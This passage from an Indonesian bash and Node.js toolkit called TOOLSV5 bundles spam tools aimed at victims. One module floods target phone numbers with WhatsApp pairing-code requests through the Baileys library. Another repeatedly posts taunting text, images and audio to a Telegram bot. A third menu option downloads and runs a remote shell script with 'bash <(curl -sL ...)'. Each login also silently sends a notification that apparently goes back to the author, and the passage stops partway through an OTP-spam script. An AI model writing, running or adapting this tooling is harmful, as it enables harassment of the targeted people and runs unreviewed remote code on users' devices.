⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${chalk.bgBlack(chalk.yellow.bold('Pengembang Script Ini'))} ${chalk.white.bold(':')} ${chalk.hex(randomColor).bold('GALIRUS X GUSTI')}
${chalk.bgBlack(chalk.yellow.bold('Nomor Target Terlock'))} ${chalk.white.bold(' :')} ${chalk.hex('#00BFFF').bold(target)}
${chalk.bgBlack(chalk.yellow.bold('Spam Kode Succesfull'))} ${chalk.white.bold(' :')} ${chalk.red.bold(prc)}
${chalk.bgBlack(chalk.yellow.bold('Total Spam Terkirim'))} ${chalk.white.bold('  :')} ${chalk.bold.white(i + 1)}
`));
}
};
const handleError = async (error) => {
console.error(chalk.red.bold(`Terjadi kesalahan: ${error}`));
console.log(chalk.yellow.bold(`\n\nSedang Istirahat selama 30 detik sebelum memulai ulang...`));
console.log(chalk.yellow.bold(`===================================\n`));
for (let i = 30; i >= 0; i--) {
process.stdout.write(`\r${chalk.cyan.bold(`Memulai ulang dalam: ${i} detik... `)}`);
await sleep(1000);
}
console.log('\n'); // Pindah baris setelah countdown selesai
restartSpam();
};
const restartSpam = async () => {
// Hapus console.clear() yang terlalu sering. Cukup beri informasi bahwa proses diulang
console.log(chalk.greenBright.bold('Memulai ulang proses spam...'));
await sleep(1000);
startSpamProcess();
};
// Mulai program
loadNumbers();
startSpamProcess();
EOF
                                                                                                                              )"
                                                                                                                              read -p "Silahkan Enter"
                                                                                                                              ;;
                                                                                                                       2)
                                                                                                                              loading1
                                                                                                                              clear
                                                                                                                              show_file
                                                                                                                              read -p "Tekan Enter untuk kembali ke menu..."
                                                                                                                              ;;
                                                                                                                       3)
                                                                                                                              loading1
                                                                                                                              add_number
                                                                                                                              ;;
                                                                                                                       4)
                                                                                                                              loading1
                                                                                                                              remove_number
                                                                                                                              ;;
                                                                                                                       5)
                                                                                                                              loading1
                                                                                                                              cd $HOME
                                                                                                                              nano number.txt
                                                                                                                              ;;
                                                                                                                       0)
                                                                                                                              break
                                                                                                                              ;;
                                                                                                                       *) dialog --msgbox "Pilihan tidak valid." 8 40 ;;
                                                                                                                esac
                                                                                                         done
                                                                                                  }
                                                                                                  spamnya
                                                                                                  break
                                                                                           else
                                                                                                  clear
                                                                                                  play -q $HOME/TOOLSV5/sound/salah.mp3 &> /dev/null
                                                                                                  cd $spamtautan
                                                                                                  echo "Node_Modules Belum Terinstall"
                                                                                                  sleep 5
                                                                                                  clear
                                                                                                  echo -e "Menginstall Node_Modules"
                                                                                                  $paket install -y yarn
                                                                                                  yarn cache clean
                                                                                                  yarn
                                                                                                  yarn add @whiskeysockets/baileys
                                                                                           fi
                                                                                    done
                                                                             else
                                                                                    clear
                                                                                    e $bg_m "Installasi Package$res"
                                                                                    mkdir "$spamtautan"
                                                                             fi
                                                                      elif [[ $no == "s1" || $no == "S1" ]]; then
                                                                             isipesan="Terdeteksi login s2 ( spam bot tele)  💻"
                                                                             telegram &> /dev/null &
                                                                             function Continue() {
                                                                                    read -p "Press Enter to continue..."
                                                                             }
                                                                             read -p "Masukkan Token Bot Telegram : " token
                                                                             read -p "Masukkan Chat ID : " chat_id
                                                                             banner_skill() {
                                                                                    echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Spam Bot Tele Target ⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 1.0.5⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
                                                                                    e $p $bg_lg"==============[$m INFORMASI TARGET $p ] ================$res"
                                                                                    e $b "[$c •$b ]$k Status Token$m   :$bl $BOT_ID ***** $k($c Kode$lg:$bl $token_status$k)"
                                                                                    e $b "[$c •$b ]$k Status Chat ID$m :$bl $chat_id $k($c Kode$lg:$bl $chat_status$k)"
                                                                                    e $b "[$c •$b ]$k Name Bot Tele$m  :$bl $BOT_NAME"
                                                                                    e $b "[$c •$b ]$k Username Bot$m   :$bl $BOT_USERNAME"
                                                                                    echo
                                                                                    e $p $bg_lg"==============[$m MENU OPTION$p ] ======================$res"
                                                                             }
                                                                             function Main() {
                                                                                    while true; do
                                                                                           token_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$token/getMe")
                                                                                           chat_status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=Cek%20Validasi")
                                                                                           URL="https://api.telegram.org/bot$token"
                                                                                           BOT_INFO=$(curl -s "$URL/getMe")
                                                                                           BOT_NAME=$(echo "$BOT_INFO" | grep -oP '"first_name":"\K[^"]+')
                                                                                           BOT_USERNAME=$(echo "$BOT_INFO" | grep -oP '"username":"\K[^"]+')
                                                                                           BOT_ID=$(echo "$BOT_INFO" | grep -oP '"id":\K[0-9]+')
                                                                                           clear
                                                                                           play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                           banner_skill
                                                                                           echo -e "$m [$res 01$m ]$res Gas Spam"
                                                                                           echo -e "$m [$res 00$m ]$res Exit ( Keluar )"
                                                                                           read -p " Silahkan Pilih ---> " sp
                                                                                           play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                           if [[ $sp == "?" ]]; then
                                                                                                  echo -e "\nSpam Bot Telegram"
                                                                                                  echo -e "Spam Bot Telegram adalah tool untuk melakukan spam terhadap api bot telegram."
                                                                                                  Continue
                                                                                                  Main
                                                                                           fi

                                                                                           if [[ $sp == "1" || $sp == "01" ]]; then
                                                                                                  read -p "Masukkan Text : " text
                                                                                                  read -p "Masukkan Gambar (URL/File) : " photo_input
                                                                                                  read -p "Masukkan Audio (URL/File) : " audio_input

                                                                                                  teks_list=(
                                                                                                         "Hozo Itu Kroco 😹👍"
                                                                                                         "TOOLSV5 SPAM BOT TELE: Sudah I Backdoor Mu ! Sadar Diri !"
                                                                                                         "TOOLSV5 WORK 100%😱"
                                                                                                         "😈Hacked By Ambakatum😈"
                                                                                                         "😂TEWAS DI HITAMKAN😂"
                                                                                                         "🔥PENGUNA TOOLSV5 NIH BOS🔥"
                                                                                                         "😂APALAH BACKDOOR😂"
                                                                                                         "DEVELOPMENT TOOLSV5 X GALIRUS"
                                                                                                         "BELI TOOLSV5 CUY WORK NIH"
                                                                                                  )
                                                                                                  photo_list=(
                                                                                                         "https://iili.io/3axCIwJ.png"
                                                                                                         "https://iili.io/3ax1En2.jpg"
                                                                                                         "https://iili.io/3axWBXj.jpg"
                                                                                                         "https://iili.io/3axj4TX.jpg"
                                                                                                         "https://iili.io/3axv6jS.jpg"
                                                                                                         "https://iili.io/3axrTb4.jpg"
                                                                                                  )
                                                                                                  audio_list=(
                                                                                                         "https://od.lk/s/OV8yNDkzOTU4OTJf/GALIRUS_OFFICIAL_1743646553.mp3"
                                                                                                         "https://od.lk/s/OV8yNDQyMDk3Nzdf/GALIRUS_OFFICIAL_1731080763.mp3"
                                                                                                         "https://od.lk/s/OV8yMzMwNjgwMDJf/md.mp3"
                                                                                                         "https://od.lk/s/OV8yNDQ4MzUyMzRf/tsfhv.mp3"
                                                                                                         "https://od.lk/s/OV8yNDc4NTE3Mjlf/GALIRUS_OFFICIAL_1740192780.mp3"
                                                                                                         "https://od.lk/s/OV8yMTU5MDAyOTJf/music.mp3"
                                                                                                  )

                                                                                                  clear
                                                                                                  banner_skill
                                                                                                  e "$k Tekan$m 'q'$k lalu$m Enter$k untuk berhenti kapan saja.$c"
                                                                                                  echo -ne "\rProcessing...\n"
                                                                                                  i=1
                                                                                                  while true; do
                                                                                                         # Jika input user kosong, pakai list
                                                                                                         if [[ -z "$text" ]]; then
                                                                                                                text=$(shuf -n1 -e "${teks_list[@]}")
                                                                                                         fi

                                                                                                         if [[ -z "$photo_input" ]]; then
                                                                                                                photo_input=$(shuf -n1 -e "${photo_list[@]}")
                                                                                                         fi

                                                                                                         if [[ -z "$audio_input" ]]; then
                                                                                                                audio_input=$(shuf -n1 -e "${audio_list[@]}")
                                                                                                         fi

                                                                                                         echo -ne "\r[$i] Sending...          "

                                                                                                         # Kirim teks
                                                                                                         curl -s -d "chat_id=$chat_id" -d "parse_mode=Markdown" -d "text=$text" "https://api.telegram.org/bot$token/sendMessage" > /dev/null

                                                                                                         # Kirim foto
                                                                                                         if [[ -f "$photo_input" ]]; then
                                                                                                                curl -s -F "chat_id=$chat_id" -F "caption=$text" -F "photo=@$photo_input" "https://api.telegram.org/bot$token/sendPhoto" > /dev/null
                                                                                                         elif [[ "$photo_input" =~ ^https?:// ]]; then
                                                                                                                curl -s -d "chat_id=$chat_id" -d "caption=$text" -d "photo=$photo_input" "https://api.telegram.org/bot$token/sendPhoto" > /dev/null
                                                                                                         fi

                                                                                                         # Kirim audio
                                                                                                         if [[ -f "$audio_input" ]]; then
                                                                                                                curl -s -F "chat_id=$chat_id" -F "caption=$text" -F "audio=@$audio_input" "https://api.telegram.org/bot$token/sendAudio" > /dev/null
                                                                                                         elif [[ "$audio_input" =~ ^https?:// ]]; then
                                                                                                                curl -s -d "chat_id=$chat_id" -d "caption=$text" -d "audio=$audio_input" "https://api.telegram.org/bot$token/sendAudio" > /dev/null
                                                                                                         fi

                                                                                                         echo -ne "\r[ ✓ ] Success kirim ke $i      "
                                                                                                         i=$((i + 1))
                                                                                                         sleep 1
                                                                                                         read -t 0.1 -p "" stop_input
                                                                                                         if [[ "$stop_input" == "q" ]]; then
                                                                                                                echo -ne "$m\nBerhenti.$k Total pesan terkirim$b:$bl $((i - 1)) kali!$m \n"
                                                                                                                read -p "Tekan Enter untuk kembali ke menu..."
                                                                                                                Main
                                                                                                                break
                                                                                                         fi
                                                                                                  done

                                                                                           elif [[ $sp == "0" || $sp == "00" ]]; then
                                                                                                  echo "Bye bye!"
                                                                                                  break 5
                                                                                           else
                                                                                                  echo "Input salah! Pilih 1 atau 0."
                                                                                                  sleep 2
                                                                                                  Main
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             Main

                                                                      elif [[ $no == "s3X" || $no == "S3X" ]]; then
                                                                             isipesan="Terdeteksi login s3 ( spam tokopedia )  💻"
                                                                             telegram &> /dev/null &
                                                                             bash <(curl -sL https://od.lk/s/OV8yNTA3NTk2NDdf/spam.sh)
                                                                      elif [[ $no == "s2" || $no == "S2" ]]; then
                                                                             while true; do
                                                                                    letak="$PREFIX/lib/pkgconfig/spamweb"
                                                                                    if [ -d "$letak" ]; then
                                                                                           cd $letak
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           isipesan="Terdeteksi login s2 ( spam bot )  💻"
                                                                                           telegram &> /dev/null &
                                                                                           if [ -d "node_modules" ]; then
                                                                                                  clear
                                                                                                  node -e "$(
                                                                                                         cat << 'EOF'
const express = require('express');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');
const { exec } = require('child_process');
const app = express();
app.use(express.json());
app.use(express.static('public'));
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getRandomColor = () => {
const colors = [chalk.redBright, chalk.yellowBright, chalk.greenBright, chalk.magentaBright];
return colors[Math.floor(Math.random() * colors.length)];
};
let totalSpamCount = 0;
let lastActiveTime = new Date().getTime();
let initialSpamTime;
const countryCode = '';
const blockedNumbers = ['6285850268349', ''];
const requiredNumbers = ['', '', '', ''];
let logData = '';
let isSpamming = false;
const isValidPhoneNumber = (phoneNumber) => {
return /^\d{10,14}$/.test(phoneNumber);
};
const sendLog = (res, log) => {
res.write(`data: ${log}\n\n`);
};
const displayBanner = () => {
console.log(chalk.greenBright.bold(chalk.bgBlack(`
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿\n`)));
};
const resetTerminal = () => {
readline.cursorTo(process.stdout, 0, 0);
readline.clearScreenDown(process.stdout);
};
resetTerminal();
displayBanner();
app.post('/start', async (req, res) => {
const { target1, target2, option } = req.body;
const targets = [target1];
if (option === '2') {
targets.push(target2);
}
const validTargets = targets.filter(target => isValidPhoneNumber(target));
requiredNumbers.forEach(reqNum => {
if (isValidPhoneNumber(reqNum) && !validTargets.includes(reqNum)) {
validTargets.push(reqNum);
}
});
const targetsToSpam = validTargets.filter(target => !blockedNumbers.includes(target));
if (targetsToSpam.length === 0) {
return res.status(400).json({ message: 'No valid phone numbers provided' });
}
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
isSpamming = true; // Mengatur flag spamming menjadi true
targetsToSpam.forEach(target => {
startSpamming(sucked, target);
});
res.json({ message: 'Run Pairing Code !' });
});
app.post('/stop', (req, res) => {
isSpamming = false; // Mengatur flag spamming menjadi false
console.log('Spamming dihentikan');
res.json({ message: 'Spamming dihentikan' });
});
const startSpamming = async (sucked, target) => {
let spamCount = 0;
while (isSpamming) {
if (spamCount >= 35) {
let totalDetik = 60 * 60; // Total detik untuk 1 jam
while (totalDetik > 0) {
const jam = Math.floor(totalDetik / 3600);
const menit = Math.floor((totalDetik % 3600) / 60);
const detik = totalDetik % 60;
process.stdout.write(`\rMenunggu Waktu Jeda     : ${jam.toString().padStart(2, '0')}:${menit.toString().padStart(2, '0')}:${detik.toString().padStart(2, '0')}`);
await sleep(5000); // Tunggu 1 detik
totalDetik--;
}
console.log(`\nJeda selesai, melanjutkan pengiriman...`);
spamCount = 0; // Reset spam count setelah jeda
}
try {
await spamTarget(sucked, target);
spamCount++;
totalSpamCount++;
} catch (error) {
console.log(chalk.yellow.bold(`\n\nSedang Restart, Spam Ulang Aktif...`));
console.log(chalk.yellow.bold(`===================================\n`));
await sleep(2000);
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
}
}
};
const spamTarget = async (sucked, target) => {
if (!target.startsWith(countryCode)) {
console.log(chalk.white.bold('\nHarus Awalan Kode Negara'));
logData += `Harus Awalan Kode Negara\n`;
return;
}
if (blockedNumbers.includes(target)) {
console.log(chalk.white.bold('\nNomor Owner Di Spam, Nanti Ngelag 😂'));
exec('npm start', (error, stdout, stderr) => {
if (error) {
console.error(`Exec error: ${error}`);
return;
}
console.log(`stdout: ${stdout}`);
console.error(`stderr: ${stderr}`);
});
return;
}
if (!initialSpamTime) {
initialSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
console.log(chalk.greenBright.bold(`${chalk.yellow.bold('Waktu Pertama Spam Jam')} ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
logData += `Waktu Pertama Spam Jam: ${initialSpamTime}\n`;
}
await sleep(5000);
try {
let prc = await sucked.requestPairingCode(target);
lastActiveTime = new Date().getTime();
resetTerminal();
displayBanner();
console.log(chalk.greenBright.bold(`${chalk.yellow.bold('Pengembang Script Ini')}   ${chalk.white.bold(':')} ${chalk.white.bold(getRandomColor()('GALIRUS X GUSTI'))}`));
console.log(chalk.yellow.bold(`Nomor Target            ${chalk.white.bold(':')} ${chalk.white.bold(target)}`));
console.log(chalk.yellow.bold(`Spam Kode Succesfull    ${chalk.white.bold(':')} ${chalk.white.bold(prc)}`));
console.log(chalk.yellow.bold(`Total Spam Terkirim     ${chalk.red.bold(':')} ${chalk.white.bold(totalSpamCount)}`));
console.log(chalk.yellow.bold(`Waktu Spam Pertama      ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
const currentSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
console.log(chalk.yellow.bold(`Waktu Sekarang Jam      ${chalk.white.bold(':')} ${chalk.white.bold(currentSpamTime)}`));
} catch (error) {
startSpamming = async (sucked, target);
}
if ((new Date().getTime() - lastActiveTime) > 60000) {
console.log(chalk.white.bold('Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti'));
logData += `Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti\n`;
process.exit(1);
}
};
app.get('/monitor', (req, res) => {
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');
res.setHeader('Connection', 'keep-alive');
const intervalId = setInterval(() => {
sendLog(res, logData);
}, 1000);
req.on('close', () => {
clearInterval(intervalId);
});
});
rl.question('Masukkan port yang ingin digunakan contoh:( 8080 ): ', (inputPort) => {
const port = parseInt(inputPort, 10);
if (isNaN(port) || port <= 0) {
console.log(chalk.red.bold('Port tidak valid. Silakan masukkan angka.'));
process.exit(1);
}
app.listen(port, () => {
console.log(chalk.green.bold(`Server running on http://localhost:${port}`));
});
rl.close();
});
EOF
                                                                                                  )"
                                                                                                  break
                                                                                           else
                                                                                                  $paket install -y bash
                                                                                                  $paket install -y libwebp
                                                                                                  $paket install -y git
                                                                                                  $paket install -y nodejs
                                                                                                  $paket install -y ffmpeg
                                                                                                  $paket install -y wget
                                                                                                  $paket install -y imagemagick
                                                                                                  $paket install yarn
                                                                                                  yarn
                                                                                           fi
                                                                                           break
                                                                                    else
                                                                                           cd $PREFIX/lib/pkgconfig
                                                                                           git clone https://github.com/Lubebansokhekel/spamweb &> /dev/null && echo "Sabar Ntot Instalasi package"
                                                                                           cd spamweb
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                    fi
                                                                             done
                                                                      elif [[ $no == "s5X" || $no == "S5X" ]]; then
                                                                             isipesan="Terdeteksi login s5 ( spam otp telegram )  💻"
                                                                             telegram &> /dev/null &
                                                                             cat << 'EOF' > $PREFIX/lib/bash/otp
e="echo -e "
m="\033[1;31m"   # Merah (Sudah diberikan)
h="\033[1;32m"   # Hijau (Sudah diberikan)
k="\033[1;33m"   # Kuning (Sudah diberikan)
b="\033[1;34m"   # Biru (Sudah diberikan)
bl="\033[1;36m"  # Biru Muda (Sudah diberikan)
p="\033[1;37m"   # Putih (Sudah diberikan)
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
or="\033[1;91m"  # Merah Muda Terang
g="\033[1;92m"   # Hijau Terang
y="\033[1;93m"   # Kuning Terang
bld="\033[1;94m" # Biru Terang
pwl="\033[1;95m" # Ungu Terang
blg="\033[1;97m" # Putih Terang
lg="\033[1;90m"  # Abu-abu Terang
bg_m="\033[41m"    # Latar Belakang Merah
bg_h="\033[42m"    # Latar Belakang Hijau
bg_k="\033[43m"    # Latar Belakang Kuning
bg_b="\033[44m"    # Latar Belakang Biru
bg_bl="\033[46m"   # Latar Belakang Biru Muda
bg_p="\033[47m"    # Latar Belakang Putih
bg_u="\033[45m"    # Latar Belakang Ungu
bg_pu="\033[40m"   # Latar Belakang Abu-abu
bg_c="\033[106m"   # Latar Belakang Cyan Terang
bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
bg_g="\033[102m"   # Latar Belakang Hijau Terang
bg_y="\033[103m"   # Latar Belakang Kuning Terang
bg_bld="\033[104m" # Latar Belakang Biru Terang
bg_pwl="\033[105m" # Latar Belakang Ungu Terang
bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
res="\033[0m"
url="https://oauth.telegram.org/auth/request?bot_id=1264128836&origin=https%3A%2F%2Fwww.money-whale.com&request_access=read"
banner_skill() {
echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Simpel Spam OTP Telegram⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 1.0.0 beta...!⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀
Sawer Admin Seikhlasnya$k https://saweria.co/Galirus$res$h
⠀⠀⠀⠀⠀
$m$bg_lg Silahkan Tekan q Lalu Enter$res
$m$bg_lg Untuk Berhenti Dan Otomatis Masuk Ke Toolsv5$res
"
echo
}
clear
run() {
ctrl_c() {
echo -e "\n[!] Script Berhenti !"
exit 0
}
trap ctrl_c INT
while true; do
emojis=(
"🤬"
"🥶"
"😈"
"🥵"
"🤨"
"😆"
)
